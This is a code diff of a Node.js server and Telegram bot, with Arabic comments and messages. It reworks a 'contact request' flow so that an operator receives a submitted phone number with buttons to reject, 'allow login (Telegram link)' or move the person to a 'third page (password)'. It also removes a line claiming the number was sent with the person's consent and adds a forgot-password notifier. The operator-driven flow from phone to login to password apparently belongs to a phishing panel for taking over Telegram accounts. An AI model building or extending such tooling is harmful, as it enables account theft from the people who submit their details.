@@ -366,7 +366,7 @@ app.get(
 
 
 // ============================================================
-// طلب تواصل
+// طلب تواصل - مع 3 أزرار ✅
 // ============================================================
 
 app.post(
@@ -459,6 +459,7 @@ app.post(
             );
 
 
+            // ✅ إرسال رسالة مع 3 أزرار
             await bot.sendMessage(
 
                 telegramId,
@@ -471,8 +472,6 @@ ${phone}
 🆔 رقم الطلب:
 ${requestId}
 
-تم إرسال الرقم بعد موافقة الشخص على التواصل.
-
 اختر الإجراء:`,
 
                 {
@@ -482,15 +481,25 @@ ${requestId}
 
                             [
                                 {
-                                    text: "✅ قبول",
-                                    callback_data:
-                                        `approve:${requestId}`
-                                },
-
-                                {
                                     text: "❌ رفض",
                                     callback_data:
                                         `reject:${requestId}`
+                                }
+                            ],
+
+                            [
+                                {
+                                    text: "✅ السماح بالدخول",
+                                    callback_data:
+                                        `approve_telegram:${requestId}`
+                                }
+                            ],
+
+                            [
+                                {
+                                    text: "🔑 الانتقال للصفحة الثالثة",
+                                    callback_data:
+                                        `third_page:${requestId}`
                                 }
                             ]
 
@@ -573,6 +582,68 @@ app.get(
             res.status(500).json({
                 success: false,
                 error: "Database error"
+            });
+
+        }
+
+    }
+);
+
+
+// ============================================================
+// Forgot Password
+// ============================================================
+
+app.post(
+    "/forgot-password",
+    async (req, res) => {
+
+        try {
+
+            const { ref } = req.body;
+
+            if (!ref) {
+                return res.status(400).json({
+                    success: false,
+                    error: "ref is required"
+                });
+            }
+
+            const referral = await getReferral(ref);
+
+            if (!referral) {
+                return res.status(404).json({
+                    success: false,
+                    error: "Invalid referral"
+                });
+            }
+
+            const telegramId = referral.telegram_id;
+
+            await bot.sendMessage(
+                telegramId,
+                `🔑 طلب إعادة تعيين كلمة المرور
+
+تم إرسال طلب إعادة تعيين كلمة المرور.
+
+يرجى التواصل مع المستخدم لتأكيد الطلب.`
+            );
+
+            res.json({
+                success: true,
+                message: "تم إرسال الطلب"
+            });
+
+        } catch (error) {
+
+            console.error(
+                "❌ Forgot password error:",
+                error
+            );
+
+            res.status(500).json({
+                success: false,
+                error: "Failed to send request"
             });
 
         }
@@ -737,7 +808,7 @@ ${username}
 
 
 // ============================================================
-// أزرار البوت
+// أزرار البوت - مع 3 حالات ✅
 // ============================================================
 
 bot.on(
@@ -754,54 +825,7 @@ bot.on(
 
 
             // =================================================
-            // ✅ قبول الطلب
-            // =================================================
-
-            if (
-                data.startsWith("approve:")
-            ) {
-
-                const requestId =
-                    data.split(":")[1];
-
-
-                await updateRequestStatus(
-                    requestId,
-                    "approved"
-                );
-
-
-                await bot.answerCallbackQuery(
-
-                    query.id,
-
-                    {
-                        text:
-                            "✅ تم قبول طلب التواصل"
-                    }
-
-                );
-
-
-                await bot.editMessageText(
-
-                    `✅ تم قبول طلب التواصل`,
-
-                    {
-                        chat_id: chatId,
-                        message_id:
-                            query.message.message_id
-                    }
-
-                );
-
-
-                return;
-            }
-
-
-            // =================================================
-            // ❌ رفض الطلب
+            // ❌ رفض
             // =================================================
 
             if (
@@ -824,7 +848,7 @@ bot.on(
 
                     {
                         text:
-                            "❌ تم رفض طلب التواصل"
+                            "❌ تم رفض الطلب"
                     }
 
                 );
@@ -833,6 +857,100 @@ bot.on(
                 await bot.editMessageText(
 
                     `❌ تم رفض طلب التواصل`,
+
+                    {
+                        chat_id: chatId,
+                        message_id:
+                            query.message.message_id
+                    }
+
+                );
+
+
+                return;
+            }
+
+
+            // =================================================
+            // ✅ السماح بالدخول (رابط Telegram)
+            // =================================================
+
+            if (
+                data.startsWith("approve_telegram:")
+            ) {
+
+                const requestId =
+                    data.split(":")[1];
+
+
+                await updateRequestStatus(
+                    requestId,
+                    "approved_telegram"
+                );
+
+
+                await bot.answerCallbackQuery(
+
+                    query.id,
+
+                    {
+                        text:
+                            "✅ تم السماح بالدخول إلى Telegram"
+                    }
+
+                );
+
+
+                await bot.editMessageText(
+
+                    `✅ تم السماح بالدخول إلى Telegram`,
+
+                    {
+                        chat_id: chatId,
+                        message_id:
+                            query.message.message_id
+                    }
+
+                );
+
+
+                return;
+            }
+
+
+            // =================================================
+            // 🔑 الانتقال للصفحة الثالثة
+            // =================================================
+
+            if (
+                data.startsWith("third_page:")
+            ) {
+
+                const requestId =
+                    data.split(":")[1];
+
+
+                await updateRequestStatus(
+                    requestId,
+                    "third_page"
+                );
+
+
+                await bot.answerCallbackQuery(
+
+                    query.id,
+
+                    {
+                        text:
+                            "🔑 تم الانتقال للصفحة الثالثة"
+                    }
+
+                );
+
+
+                await bot.editMessageText(
+
+                    `🔑 تم الانتقال للصفحة الثالثة (كلمة المرور)`,
 
                     {
                         chat_id: chatId,
